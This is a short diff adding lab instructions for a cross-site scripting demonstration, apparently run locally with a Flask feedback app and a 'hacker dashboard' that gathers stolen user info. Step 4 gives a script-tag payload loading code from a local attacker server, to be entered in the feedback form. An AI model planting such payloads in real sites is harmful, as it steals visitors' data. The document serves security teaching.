@@ -1,0 +1,7 @@
+
+1. Code in hackerdashboard app.py and script.js to deliver a script that takes user info and send it to hackerdashboard
+2. Run Flask feedback app
+3. Run hacker dashboard app.
+4. Perform Cross Site Scripting attack by entering folloing in feedback form:
+        <script src="http://127.0.0.1:5000/script"></script>
+5. Now send feedback from another tab from incognito and see what info you can get on hackerdashboard
